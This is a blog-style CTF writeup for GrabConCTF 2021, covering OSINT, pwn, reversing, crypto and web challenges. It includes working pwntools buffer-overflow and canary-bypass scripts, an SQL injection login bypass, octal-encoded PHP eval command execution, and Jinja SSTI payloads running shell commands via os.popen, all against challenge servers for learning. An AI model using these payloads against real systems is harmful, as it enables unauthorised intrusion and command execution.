@@ -1,0 +1,997 @@
+---
+layout: post
+title:  "GrabConCTF 2021 Writeup"
+tags: CTF
+---
+
+GrabConCTF is a CTF event that coincides with GrabCon, a 2-day cyber security conference.
+Hosted by The Cyber Grabs, this CTF lasted for a single day and had quite a few interesting challenges.
+Luckily, this one ended up being a nice fun break from the grueling challenges of the previous few
+I had participated in. Other than a bit of spotty infrastructure the event went pretty smooth in
+my opinion.
+
+Anyway, here are some of the challenges I solved during the event.
+
+&nbsp;
+
+## **OSINT**
+
+### **Proton Date**
+
+```
+Can you find the date, when was this email created?
+
+sc4ry_gh0st@protonmail[dot]com
+```
+
+The first OSINT challenge is all about protonmail. To start off, I didn't really know
+anything about OSINT for protonmail so I looked up some tricks. In my searching I found
+a nice little script to OSINT protonmail accounts for me.
+
+![Script](/assets/grabCON/proton.png)
+<figcaption align=center><b>Figure 1-1: ProtOSINT Script Results</b></figcaption>
+&nbsp;
+
+
+The challenge ended up being as simple as that. If you wanna check out this script
+its repository can be found [here](https://github.com/pixelbubble/ProtOSINT)
+
+&nbsp;
+
+### **Victim 1**
+
+```
+We got to know our victims is hiding somewhere.
+We got access to live CCTV camera of that place.
+Can you find zip code of that location?
+```
+
+For this challenge we are given a CCTV camera feed of a location somewhere in the world
+and are tasked to find out just where it is. The postal code is what we're looking for
+specifically.
+
+![CCTV](/assets/grabCON/victim1.png)
+<figcaption align=center><b>Figure 2-1: CCTV Camera Screenshot</b></figcaption>
+&nbsp;
+
+The CCTV footage provides a view overlooking a construction site of a house and we
+can see a gondola running in the background. However, other than that there isn't much
+detail in the footage itself. Aside from the CCTV feed, we do have an IP address
+from which the feed is hosted.
+
+```
+31.207.115.133
+```
+
+Using Shodan, I searched the IP address in question.
+
+![Shodan](/assets/grabCON/victim2.png)
+<figcaption align=center><b>Figure 2-2: Shodan Search Results</b></figcaption>
+&nbsp;
+
+The results made things pretty simple, the location of the feed was Brunico, Italy.
+The next step was to find the postal code(s) of the surrounding area and then
+narrow down that list (if necessary).
+
+![Postal Code](/assets/grabCON/victim3.png)
+<figcaption align=center><b>Figure 2-3: Brunico Italy Postal Code</b></figcaption>
+&nbsp;
+
+Luckily there is only a single postal code for Brunico. Finally, to solve this challenge
+we encapsulate the postal code in the GrabCON flag format.
+
+```
+GrabCON{39031}
+```
+
+&nbsp;
+
+### **Victim 2**
+
+```
+We've managed to get into that place in Trentino-Alto Adige,
+but we saw a diary left behind in that place owned by him.
+Go through that diary we've got this photo.
+Locals said it was a scenic view of a mountain from a hotel.
+Can you find the location of the hotel located near to this place?
+```
+
+This next challenge revolves around locating a hotel based on a photo of an area
+nearby.
+
+![Photo](/assets/grabCON/vic1.jpg)
+<figcaption align=center><b>Figure 3-1: Challenge Photograph</b></figcaption>
+&nbsp;
+
+
+There are a few things to go on in the photo. The surrounding area seems pretty unique,
+and there is a building that says "Schennerhof". However, first I started out with
+a quick reverse image search.
+
+![Image Search](/assets/grabCON/vic2.png)
+<figcaption align=center><b>Figure 3-2: Reverse Image Search of the Challenge Photo</b></figcaption>
+&nbsp;
+
+The results were filled with the exact clock tower from the photo. Based of the results,
+the location of the photo had to be Schenna, Italy. Next I narrowed down the specific location
+by searching up Schennerhof.
+
+![Schennerhof](/assets/grabCON/vic4.png)
+<figcaption align=center><b>Figure 3-3: Schennerhof on Google Maps</b></figcaption>
+&nbsp;
+
+We found Schennerhof. Unfortunately, there are a ton of hotels nearby. Thinking back to the
+original image, it seems like the photo was taken from behind Schennerhof so let's start there.
+Directly behind (and a bit above) Schennerhof there is one hotel: Hotel Hohenwart.
+
+![Hotel](/assets/grabCON/vic5.png)
+<figcaption align=center><b>Figure 3-4: Hotel Hohenwart Exterior</b></figcaption>
+&nbsp;
+
+The area around the hotel seems just about right and inputting this hotel as my answer completed the challenge.
+
+&nbsp;
+
+### **Website**
+
+```
+My friend is having a website named, "Great Animals Here".
+He have leaked the flag on his website. Can you find the flag?
+
+Hint: He used free website builder tool to create his site. greatanimalshere
+```
+
+In this task we are looking for a specific website. The hints here are a huge help and
+direct us to a free website builder tool. If we search this exact phrase up we get
+a handful of results.
+
+![Website Builders](/assets/grabCON/website1.png)
+<figcaption align=center><b>Figure 4-1: Free Website Builder Tool Search</b></figcaption>
+&nbsp;
+
+I started with the top result, Weebly. Eventually, after a bit of searching I reasoned,
+to keep building your site with Weebly totally free, you would have to host it on their subdomain.
+The format for Weebly subdomains is:
+
+```
+yoursitename.weebly.com
+```
+
+I then tried out the name given in the hints and arrived at greatanimalshere.weebly.com
+
+![Animals](/assets/grabCON/website2.png)
+<figcaption align=center><b>Figure 4-2: greatanimalshere.weebly.com</b></figcaption>
+&nbsp;
+
+![Flag](/assets/grabCON/website3.png)
+<figcaption align=center><b>Figure 4-3: The Challenge Flag</b></figcaption>
+&nbsp;
+
+After scrolling down a bit, we can see the flag in the Rhino section.
+
+&nbsp;
+
+### **The Tour 1**
+
+```
+w0nd3r50uL! I know her but she did something horrible!
+She recently switched to some free and open-source software for
+running self-hosted social networking services.
+Check out her profile and find the last location she visited when she felt hungry?
+```
+
+For this challenge we need to do two things: locate w0nd3r50uL's profile and
+find her last location. I started by searching up self-hosted social networking services.
+Once again, it helped quite a bit to search the exact phrase found in the challenge description.
+
+![Mastodon](/assets/grabCON/tour1.png)
+<figcaption align=center><b>Figure 5-1: Search Results for Open Source Social Networks</b></figcaption>
+&nbsp;
+
+The first result matches the phrase exactly so it seems like the best place to start.
+I then searched to see if Mastodon hosts public social network sites. Turns out, there are
+several. However, only one was generic enough, big enough, and public enough to host
+something for a CTF.
+
+![Social Network](/assets/grabCON/tour2.png)
+<figcaption align=center><b>Figure 5-2: The Signup Page For Mastodon Social</b></figcaption>
+&nbsp;
+
+Mastodon Social was where my search began. After signing up I searched the site for
+w0nd3r50uL's profile.
+
+![w0nd3r50uL](/assets/grabCON/tour3.png)
+<figcaption align=center><b>Figure 5-3: w0nd3r50uL's Profile</b></figcaption>
+&nbsp;
+
+I found w0nd3r50uL's profile pretty quickly (only 1 result in the search), all that was
+left was to find where they were.
+
+![Food](/assets/grabCON/tour4.png)
+<figcaption align=center><b>Figure 5-4: A Photo of Some Food Posted by w0nd3r50uL</b></figcaption>
+&nbsp;
+
+A few posts down was a single photo of some food from a restaurant they had visited.
+I did a bunch of searching around the photo, but there were no obvious hints, so naturally,
+I reverse image searched it.
+
+![Reverse Image](/assets/grabCON/tour5.png)
+<figcaption align=center><b>Figure 5-5: Reverse Image Search of the Food</b></figcaption>
+&nbsp;
+
+I didn't expect much at first but at the bottom of the search was a result for a place in Belgrade.
+Apparently, the photo was taken at Cafeteria Gardos. Let's look it up.
+
+![Flag](/assets/grabCON/tour6.png)
+<figcaption align=center><b>Figure 5-6: Cafeteria Gardos Reviews</b></figcaption>
+&nbsp;
+
+Among the many high scoring reviews for the restaurant, there was the flag and with
+it the challenge is solved.
+
+&nbsp;
+
+### **The Tour 2**
+
+```
+Can you find the flight number and the flight operator of the
+last flight that took her to the final destination?
+```
+
+A continuation of the previous challenge, this one revolves around finding out which
+flight w0nd3r50uL took. Our main hints are two photos on their profile. One of an airport exterior
+and one of their boarding pass for the flight. From the result of the previous challenge,
+I found out that the airport was Belgrade's Nikola Tesla International Airport. However
+given how many flights leave there per day, we need a bit more info.
+
+![Boarding Pass](/assets/grabCON/airplane1.png)
+<figcaption align=center><b>Figure 6-1: w0nd3r50uL's Boarding Pass Photo</b></figcaption>
+&nbsp;
+
+As it turns out, all of the info needed to solve this challenge is located in the
+barcode of the boarding pass. As some sort of last ditch effort, I punched the photo
+of the ticket into a barcode scanner. To my surprise I got some interesting results.
+
+![Barcode Scanner](/assets/grabCON/airplane2.png)
+<figcaption align=center><b>Figure 6-2: Barcode Scanner Results</b></figcaption>
+&nbsp;
+
+
+There is a lot seemingly random information within this barcode. After a bit of searching,
+I learned it was very reasonable to decode this information. Let's look into what some of code reveals.
+
+```
+PERKOVIC/MELANI MS      EYCBKAV BEGISTJU 0802 300Y009F0022 162>5
+32
+2MO0300BJU                                        2A115212207326
+7 0                          N
+```
+
+So to start off, the first section of the text shows the last name, first name, and title of
+the owner of the boarding pass. Next "EYCBKAV" supposedly represents a booking reference number,
+a relatively unimportant detail for this challenge. Next we have "BEGISTJU", this section shows
+the departure airport code (BEG, Belgrade), followed by the arrival airport code (IST, Istanbul),
+and finally the airline code (JU, Air Serbia). The final important detail comes next with "0802",
+this number represents the flight number.
+
+![Flight Number](/assets/grabCON/airplane3.png)
+<figcaption align=center><b>Figure 6-3: Search Results for Flight Number JU802</b></figcaption>
+&nbsp;
+
+
+Combining all these gives us all the details we need to solve this challenge. Flight number JU802,
+departure airport BEG, arrival airport IST, and airline Air Serbia.
+
+```
+GrabCON{JU802_Air_Serbia}
+```
+
+If you want to look into this boarding pass decoding stuff take a look at [this article](https://shaun.net/notes/whats-contained-in-a-boarding-pass-barcode/)
+
+&nbsp;
+
+## **Pwn**
+
+### **Easybin**
+
+Finally an pwn challenge I can do! This challenge is honestly an excellent first step for
+beginners in this category like me. Here is the decompiled code of the challenge binary.
+
+```
+undefined8 main(void)
+
+{
+  char local_38 [48];
+
+  gets(local_38);
+  printf("well lets check if you can bypass me!!!");
+  return 0;
+}
+
+undefined8 vuln(void)
+
+{
+  execve("/bin/sh",(char **)0x0,(char **)0x0);
+  return 0;
+}
+```
+
+Basically, this is a simple buffer overflow challenge. The goal is to overflow the
+local_38 buffer and overwrite the return of main() with the address of vuln().
+If this works we will get a shell on the remote machine. There are no overflow protections
+on this binary.
+
+The first step was to find the address of vuln so I could have a value to overwrite
+the return address to. I did some investigation and found it was 0x401146. Next I need to know
+how much to overflow the buffer.
+
+Since this is a 64-bit binary, I need to overwrite the buffer with 48-bytes of junk,
+but also I need to overwrite rbp with 8-bytes of junk. I confirmed this with some
+pattern offset trickery in gdb. Finally, it was time to make a script to solve the challenge.
+
+```
+from pwn import *
+
+r = remote('35.205.161.145', 49153)
+
+payload = b'a'*56
+payload += p64(0x401146)
+
+r.sendline(payload)
+r.interactive()
+```  
+
+This is a simple remote script that results in a shell on the remote machine running the binary.
+The final step is to cat flag.txt and retrieve the flag.
+
+&nbsp;
+
+### **Can you?**
+
+This next pwn challenge is still fairly simple but does have a single layer of
+protection against overflow. Here is the decompiled code for the binary.
+
+```
+void vuln(void)
+
+{
+  int in_GS_OFFSET;
+  char *__buf;
+  undefined4 uVar1;
+  undefined4 uVar2;
+  int local_78;
+  char local_74 [100];
+  int local_10;
+
+  uVar2 = 0x80492d6;
+  local_10 = *(int *)(in_GS_OFFSET + 0x14);
+  for (local_78 = 0; local_78 < 2; local_78 = local_78 + 1) {
+    uVar1 = 0x200;
+    __buf = local_74;
+    read(0,__buf,0x200);
+    printf(local_74,__buf,uVar1,uVar2);
+  }
+  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
+    __stack_chk_fail_local();
+  }
+  return;
+}
+
+
+void win(void)
+
+{
+  system("/bin/sh");
+  return;
+}
+```
+
+The goal of this challenge seems fairly straightforward. We need to overflow local_74
+in vuln() and overwrite the return address to win(). However, there is a stack canary
+preventing us from doing a simple overflow like last time.
+
+```
+if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
+  __stack_chk_fail_local();
+}
+```
+
+When we overflow local_74 we end up overwriting the canary value and the program
+terminates. To bypass this we need to know the canary value beforehand. To do this
+we either need to bruteforce it or, in this case, leak the value of it.
+
+```
+read(0,__buf,0x200);
+printf(local_74,__buf,uVar1,uVar2);
+```
+
+To leak the value I used format strings. I used a great tutorial you can find [here](https://www.cs.wcupa.edu/schen/security/canary/)
+to stumble my way through this process. Following the tutorial, I figured that to leak the
+canary value I needed to use a `%31$x` format string. I confirmed this with gdb and the following
+script.  
+
+```
+from pwn import *
+
+p = process('./cancancan')
+
+p.recvuntil(b'bypass me???\n')
+p.sendline(b'%31$x')
+leak = p.recvline().decode()
+log.info("canary value: 0x%s" % leak)
+```
+
+Next we need to figure out how much to overflow the buffer. Using the pattern offset
+idea from the last challenge it's easy to figure this out. Weirdly enough, just like the
+tutorial, the value ended up being 112. So to finish this overflow I just needed to
+
+1. Fill the buffer with 100-bytes of data
+2. Write the canary value to its variable
+3. Write another 12-bytes of junk to reach the return pointer
+4. Overwrite the return address with the address of win()
+
+```
+from pwn import *
+
+p = remote('35.246.42.94', 31337)
+
+p.recvuntil(b'bypass me???\n')
+p.sendline(b'%31$x')
+leak = p.recvline().decode()
+log.info("canary value: 0x%s" % leak)
+
+payload = b'a'*100
+payload += p32(int(leak, 16))
+payload += b'a'*12
+payload += p32(0x08049236)
+
+p.sendline(payload)
+p.interactive()
+```
+
+Once the script does its job, it's as easy as reading flag.txt to solve the challenge.
+
+&nbsp;
+
+## **Reversing**
+
+### **Easy Rev**
+
+```
+Easy Reversing...
+```
+
+This first reversing challenge is fairly simple and straightforward. To start off
+I took the binary and disassembled it.
+
+![Disassembled](/assets/grabCON/easyrev1.png)
+<figcaption align=center><b>Figure 9-1: Easy Rev Disassembled</b></figcaption>
+&nbsp;
+
+Figure 9-1 shows the main function of the binary disassembled with binary ninja cloud.
+I cranked the disassembly up to high level instructions to make things easier to see.
+The code is noticeably simple at a glance, basically, it asks the user for input and
+compares it to a preset value. My assumption was that if user input matched that value
+then the flag would be printed.
+
+So in order to solve this challenge all I had to do was convert the preset value (0x140685)
+to an integer and input it into the program. Turns out the number I was looking for is
+1312389.
+
+![Input](/assets/grabCON/easyrev2.png)
+<figcaption align=center><b>Figure 9-2: Easy Rev Flag</b></figcaption>
+&nbsp;
+
+
+As it turns out, inputting this value does pass the check and prints the flag.
+
+&nbsp;
+
+### **Baby Rev**
+
+```
+Baby Reversing...
+```
+
+The second reversing challenge is a tiny bit more complex but still nothing too
+tricky. Once again here is the assembly. This time set to a lower-level of instructions.
+
+![Disassembled](/assets/grabCON/babyrev1.png)
+<figcaption align=center><b>Figure 10-1: Baby Rev Disassembled</b></figcaption>
+&nbsp;
+
+
+Most of the instructions in the assembly are moving around values and preparing
+them to be XOR'd. Since this program doesn't do much else other than that, I decided
+to look into the XOR values.  Luckily, binary ninja does all the work of xoring values for us
+in this case. The results do look particularly peculiar.
+
+```
+mov     eax, dword [rbp-0x34]  {0x99dfdf8d}
+xor     eax, 0xdeadbeef  {0x47726162}
+```
+
+This first segment XORs 0x99dfdf8d with 0xdeadbeef which results in 0x47726162. If
+we look at the result the values correspond to the ascii characters G, r, a, b, which,
+looks like the start of our flag. This means its a fair to assume the XOR results will
+give us the flag.
+
+```
+0x47726162 = Grab
+0x434f4e7b = CON{
+0x72723364 = rr3d
+0x34776179 = 4way
+0x66663130 = ff10
+
+GrabCON{rr3d4wayff10
+```
+
+Unfortunately, this flag doesn't work or make much sense, so we are missing something.
+Looking back we can see a few XORs that are different than the rest. Namely, for some operations
+the value in eax is larger than 0xdeadbeef. This may mean that some bytes are effectively lost
+during the operation.
+
+```
+0x7830 acdf8d8b
+0x0000 deadbeef       XOR
+--------------------------
+0x0000 72723364
+```
+
+The first occurrence of this happens with this segment. Looking at the lost bytes
+we can see that they have an interesting ascii value too, x and 0. I tried inserting these
+two values in their respective place had they not been lost.
+
+```
+GrabCON{xorr3d4wayff10
+```
+
+The flag starts to make a bit more sense when these values are added in. I then repeated the
+process for the similar XOR operations.
+
+```
+GrabCON{xorr3d_4way_3ff10
+```
+
+I looked a bit longer for a final closing curly brace but in the end never found it. However,
+adding one in and submitting the flag completes the challenge.
+
+&nbsp;
+
+## **Crypto**
+
+### **Warm-up**
+
+```
+Mukesh used to drink and then smoke 5 times a day.
+He is now suffering form cancer his drink was 64 rupees
+and 32 rupees cigarette that costs to cheap for him.
+And he has this much of cancer now.
+```
+
+For this warm-up crypto challenge we are given a single text file. You can find the full
+contents of the file [here](https://github.com/cpurcell31/cpurcell31.github.io/tree/gh-pages/assets/grab/mukesh.txt)
+
+```
+S01ZRENXU1NJVkhGUVZKUkpaRkZNMlNLSTVKVENWU0xLVlZYQVlLVElaTkVVVlRNS0pIRkc2U1dKVkpH
+V01LWEtaQ1VVVENXTlJORlNVS1dOUkdGS01EVUs1S0dXVlNLS1pDWFFUQ1ROUllFT1VUTE1STFZDTUxF
+Sk5MR1c0Q0lLWVlEQ1RDWEtWMkZNVjJWTkJKRk1SS09MQktHV05EWktKV0U0VlNOTlJTRVdWVEtLSkxW
+[...]
+```
+
+The contents appear to be encoded in base-64. A quick decode then reveals some text in
+base-32, which when decoded reveals some more base-64, and so on. However, each decode
+shortens the text significantly. The challenge hint began to make sense as the text needed
+to be decoded like this about 8 or 9 times before revealing the flag.
+
+```
+GrabCON{dayuum_s0n!}
+```
+
+&nbsp;
+
+### **Poke Ball RSA**
+
+```
+Eevee is in trouble. Help him as he tries to evolve into Sylveon in the Real Stormy Arena.
+```
+
+This is another simple crypto challenge involving RSA. Here we are given only a text file
+containing a value for n, e, and the ciphertext.
+
+```
+n = 49893408435009441578304482322313000743555680330161307325972720319932593723008066
+111791702358257969967375986189270334835771407768454930378758142936692220856892425205
+211845531322953469986030448003914710360878214030348922216626790700783902154443314828
+6217133494762766492655602977085105487216032806292874190551319
+e = 13490182793971054399022258418739684780619364419042384645616071152710983690808767
+518324953294667567058728659444190819105449587150123367846578353050335272736272629427
+006512244785235756616174861819521661196594664641151960244710487889352485686272290283
+3460104389620397589021732407447981724307130484482495521398799
+c = 100132888193232309251839777842498074992587507373917163874335385921940537055226546
+9119901987697203137492866750184863908732164904704034701442981534106860927522822286315
+9000694391386749707293134335448175921942580785004708381481671830222343438874448554755
+0941814186146959750515114700335721173624212499886218608818
+```
+
+Since there isn't any code to go on, the weakness has to lie within the n, e, or c.
+I input n into [factordb](http://factordb.com/) and out popped the two factors. Next to decode the text,
+I used RsaCTFTool, a nice script that attempts several attacks on RSA variables.
+The repo for RsaCTFTool can be found [here](https://github.com/Ganapati/RsaCtfTool).
+
+![RsaCTFTool](/assets/grabCON/pokeball1.png)
+<figcaption align=center><b>Figure 12-1: RsaCTFTool Results</b></figcaption>
+&nbsp;
+
+
+Figure 12-1 shows the results of the unciphering process. The results are a bit interesting.
+They reveal another step to this puzzle as they show another value for e and c. This time e
+is a very small value so it's perfect territory for a small exponent attack. The basic idea is
+I should be able to take the 'e'th root of c and get the plaintext as a result. I used wolfram
+alpha to calculate the square root of c then plugged the result into a simple script to convert
+it to bytes.
+
+![Flag](/assets/grabCON/pokeball2.png)
+<figcaption align=center><b>Figure 12-2: The Number Converted to Bytes</b></figcaption>
+&nbsp;
+
+
+And out pops the flag!
+
+&nbsp;
+
+### **Old Monk's Password**
+
+```
+Monk: What's this man? One password, different encoded forms?
+```
+
+For this challenge we are given only a python script. So let's check it out.
+
+```
+enc = b'\x0cYUV\x02\x13\x16\x1a\x01\x04\x05C\x00\twcx|z(((%.)=K%(>'
+enc1 = b'\x0bPPS\r\x0b\x02\x0f\x12\r\x03_G\t\x08yb}v+--*+*8=W,>'
+enc2 = b'\x07A[\x06\\\r\x15\t\x04\x07\x18VG]U]@\x02\x08&9&%\' 41".;'
+
+import codecs
+import random
+
+class pass_w:
+    x = "hjlgyjgyj10hadanvbwdmkw00OUONBADANKHM;IMMBMZCNihaillm"
+    def encode(self, text, i = -1):
+
+
+        if i < 0 or i > len(self.x) + 1:
+            i = random.randint(0, len(self.x) + 1)
+
+        out = chr(i)
+        for c in text:
+            out += chr(ord(c) ^ ord(self.x[i]))
+            i = (i + 1)%79                 
+
+        return codecs.encode(out)
+
+
+y = pass_w()
+print(y.encode("REDACTED"))
+
+
+#Enclose password within GrabCON{}
+```
+
+From a glance we can see that to create the encodings at the top the flag must have been
+XORed with a character found in the string x. The starting point in x is initially random but
+as the encoding continues, characters are used in order beginning at the starting point.
+Luckily, there are only len(x) potential starting places and depending on the length of the flag
+only a few of those work.
+
+However, it is easy enough to just bruteforce all 53 starting points without thinking about
+which ones couldn't possibly work. So that's what I did. I created an adjustment to the
+script that tried all the possible starting points in x then began the XOR chain with one of the encodings.
+
+```
+enc = b'\x0cYUV\x02\x13\x16\x1a\x01\x04\x05C\x00\twcx|z(((%.)=K%(>'
+enc1 = b'\x0bPPS\r\x0b\x02\x0f\x12\r\x03_G\t\x08yb}v+--*+*8=W,>'
+enc2 = b'\x07A[\x06\\\r\x15\t\x04\x07\x18VG]U]@\x02\x08&9&%\' 41".;'
+
+import codecs
+import random
+
+class pass_w:
+    x = "hjlgyjgyj10hadanvbwdmkw00OUONBADANKHM;IMMBMZCNihaillm"
+    def encode(self, text, i = -1):
+
+
+        if i < 0 or i > len(self.x) + 1:
+            i = random.randint(0, len(self.x) + 1)
+
+        out = chr(i)
+        for c in text:
+            out += chr(ord(c) ^ ord(self.x[i]))
+            i = (i + 1)%79                 
+
+        return codecs.encode(out)
+
+
+    def decode(self, text):
+
+        new_text = codecs.decode(text)
+        out = dict()
+        for i in range(len(self.x)):
+            j = i
+            out[i] = ""
+            for c in new_text[1:]:
+                out[i] += chr(ord(c) ^ ord(self.x[j]))
+                j = (j + 1)%53
+        return out
+
+
+
+
+y = pass_w()
+result = y.decode(enc1)
+for x in result:
+    print(result[x])
+
+#Enclose password within GrabCON{}
+```
+
+Here I try a possible starting point and save the result to a dictionary. Then
+I print out all of these results to see if there is a single plausible one.
+
+![Findings](/assets/grabCON/oldmonk1.png)
+<figcaption align=center><b>Figure 13-1: Bruteforcing Results</b></figcaption>
+&nbsp;
+
+
+Out of all the results only one plausible one existed "817letmein40986728ilikeapples".
+I repeated the script for the remaining encodings just to be sure but this had to be the flag.
+
+```
+GrabCON{817letmein40986728ilikeapples}
+```
+
+Sure enough, after encapsulating the phrase in the flag format, the challenge is complete.
+
+&nbsp;
+
+## **Web**
+
+### **E4sy Pe4sy**
+
+```
+Hack admin user!
+```
+
+The first web challenge involves only a link to a website.
+
+![Site](/assets/grabCON/peasy1.png)
+<figcaption align=center><b>Figure 14-1: Easy Peasy Index Page</b></figcaption>
+&nbsp;
+
+
+The index page doesn't have much on it except a bunch of food stuff and a link
+to a login page.
+
+![Login](/assets/grabCON/peasy2.png)
+<figcaption align=center><b>Figure 14-2: Easy Peasy Login Page</b></figcaption>
+&nbsp;
+
+
+Again not much else on the login page but the login form. Next I tried a few tricks on it.
+I started by testing some common password things like:
+
+- admin:admin
+- admin:password
+- admin:password123
+
+Nothing worked out so I moved onto trying a basic SQL injection. I tried the classic
+username: admin, password: ' or '1'='1
+
+![SQL](/assets/grabCON/peasy4.png)
+<figcaption align=center><b>Figure 14-3: Admin Profile Page</b></figcaption>
+&nbsp;
+
+
+And turns out it was as simple as that.
+
+&nbsp;
+
+### **Basic Calc**
+
+```
+Ever used calc based on php?
+```
+
+The next web challenge again provides only a link to a website. So let's check it out.
+
+![Site](/assets/grabCON/calc1.png)
+<figcaption align=center><b>Figure 15-1: Basic Calc Index Page</b></figcaption>
+&nbsp;
+
+
+We are greeted by a php-based calculator of sorts and some source code for it. Luckily for us,
+the source code contains the eval() function which we should be able to exploit. However,
+there is also a filter that uses regex to effectively ban us from using any letters.
+
+![Equation](/assets/grabCON/calc2.png)
+<figcaption align=center><b>Figure 15-2: Results of Inputting 12+12</b></figcaption>
+&nbsp;
+
+
+If we input an equation like "12+12" the code runs with no problems and we see the result, 24.
+
+![Bad](/assets/grabCON/calc3.png)
+<figcaption align=center><b>Figure 15-3: Results of Inputting Any Letters</b></figcaption>
+&nbsp;
+
+
+However, if we try to include any letters we get an output of "BAD". I next spent some time
+seeing if there were ways to use numbers and symbols to represent letters or invoke a sensitive function in php.
+I came across 2 ways to bypass the restrictions
+
+- XORing symbols to get letters
+- Using octal values to represent letters
+
+XORing required a bit of trial and error so I started off with the octal method. First I started with
+trying a simple command system("ls"). Encoding this results in the following octal values:
+
+```
+"\163\171\163\164\145\155\50\42\154\163\42\51" --> system("ls")
+```
+
+Note: for octals to work on this site they have to be inside quotes or else eval spits out an error.
+Anyway, let's try submitting it to the calculator.
+
+![System ls](/assets/grabCON/calc4.png)
+<figcaption align=center><b>Figure 15-4: Eval Decodes Octal and Echoes the Result</b></figcaption>
+&nbsp;
+
+
+The result isn't too hopeful. It seems that eval takes this statement literally and echoes out
+system("ls"), which I guess makes sense. It's clear that we need a way to escape the echo statement
+and call our php function. In some [articles](https://joshuanatan.medium.com/root-me-web-server-php-eval-f77584cae128)
+based around php eval filter bypassing, they say there are 3 ways to invoke a php function:
+
+1. function()
+2. $variable = “functionName”; $variable();
+3. (“functionName”)()
+
+Judging by how this site works, option 1 is off the table but 2 and 3 could be plausible.
+3 seemed the most plausible to me and definitely easier to type out so I worked with that option.
+I encoded (system)(ls) into octal and got the following values.
+
+```
+("\163\171\163\164\145\155") --> (system)
+("\154\163") --> (ls)
+
+("\163\171\163\164\145\155")("\154\163") --> (system)(ls)
+```
+
+Remembering the quotation marks to make sure eval doesn't break. Submitting this to the
+calculator was the next step.
+
+![System ls](/assets/grabCON/calc5.png)
+<figcaption align=center><b>Figure 15-5: (system)(ls) is Executed</b></figcaption>
+&nbsp;
+
+
+There we go, this was definitely the result we wanted. Now to take it a step further I
+encoded some more ls commands to see what I could find.
+
+![System ls](/assets/grabCON/calc6.png)
+<figcaption align=center><b>Figure 15-6: Contents of the Root Directory</b></figcaption>
+&nbsp;
+
+
+In the root directory we can see our goal: flagggg.txt. Now we just need to encode a command to read it.
+
+```
+("\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164") --> (cat /flagggg.txt)
+
+("\163\171\163\164\145\155")("\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164") --> (system)(cat /flagggg.txt)
+```
+
+![Flag](/assets/grabCON/calc7.png)
+<figcaption align=center><b>Figure 15-7: Contents of flagggg.txt</b></figcaption>
+&nbsp;
+
+
+And just like that, we have our flag and the challenge is complete.
+
+&nbsp;
+
+### **Breaking Bad**
+
+```
+Nothing much just a meme template 👀 of breaking bad.
+```
+
+For this next challenge we are again given only a link to a website.
+
+![Site](/assets/grabCON/bad1.png)
+<figcaption align=center><b>Figure 16-1: Breaking Bad Meme Template</b></figcaption>
+&nbsp;
+
+
+On the site we can see the start of a meme template and a form to submit our name.
+When we submit our name it will be inserted into the next part of the meme. Given the
+challenge description, I immediately began trying some template injections.
+
+![Template](/assets/grabCON/bad2.png)
+<figcaption align=center><b>Figure 16-2: Failed SSTI Attempt #1</b></figcaption>
+&nbsp;
+
+This plan didn't seem to work at first, but I soon realized that the form was filtering
+out "{{" and "}}". Well, not just that, it also filtered "." and "_". Luckily, the filtering is not recursive.
+So I could breakup the curly braces with another filtered character like ".".
+
+![Vulnerable](/assets/grabCON/bad3.png)
+<figcaption align=center><b>Figure 16-3: Successfully Identified SSTI vulnerability</b></figcaption>
+&nbsp;
+
+There we go, the site is vulnerable to SSTI. Next I need to take it a step further to find the flag.
+Unfortunately, some of the main characters I need are filtered out. After a bit of searching, I found
+just what I needed. To bypass banned underscores I could replace them with "\\x5f". I can also bypass
+period filtering by using a different format of SSTI.
+
+```
+request.application = request['application']
+```
+
+So with the filter out of the way, all that's left is to craft a few payloads and find the flag.
+My first payload was the following:
+
+```
+{.{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}.}
+```
+
+This payload turned out to be fairly simple and easily modifiable for later payloads. To modify I would
+just need to replace ls with some other command.
+
+![ls](/assets/grabCON/bad4.png)
+<figcaption align=center><b>Figure 16-4: SSTI Listing Directory Contents</b></figcaption>
+&nbsp;
+
+Excellent, now we know where the flag name is and the name of the file. I followed up by submitting the following
+command.
+
+```
+{.{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag*')['read']()}.}
+```
+
+![Flag](/assets/grabCON/bad5.png)
+<figcaption align=center><b>Figure 16-5: Contents of flag.txt</b></figcaption>
+&nbsp;
+
+I did have to use a wildcard (*) to avoid having to deal with the filter triggering on flag.txt.
+But in the end, the flag was printed out nicely into the meme template.  
+
+&nbsp;
+
+## **Conclusion**
+
+This CTF was a nice break in between a ton of very hard events I participated in earlier.
+The challenges were a bit on the easy side which must mean I am retaining some information.
+Also, the challenges still ended up being entertaining and sometimes like with OSINT and
+the Forensics ones I attempted, were fairly tricky.
+
+Overall, this was a great event, an amazing one for someone like me who is just starting out
+or wants to try a CTF.
+
+Thank you to all the challenge creators and admins who helped create and run the event!
+
+## **Lessons Learned**
+
+1. Protonmail OSINT
+2. Shodan IP Lookup
+3. Reverse Image Search OSINT
+4. Boarding Pass Barcode Decoding
+5. Basic Buffer Overflow: Return to a Function
+6. Canary Leaking and Bypass
+7. Basic Assembly Analysis
+8. Low Exponent Attacks on RSA
+9. Encoding Bruteforcing
+10. Basic SQL Injection
+11. PHP: Ways to Call Functions
+12. SSTI with Filter Bypass
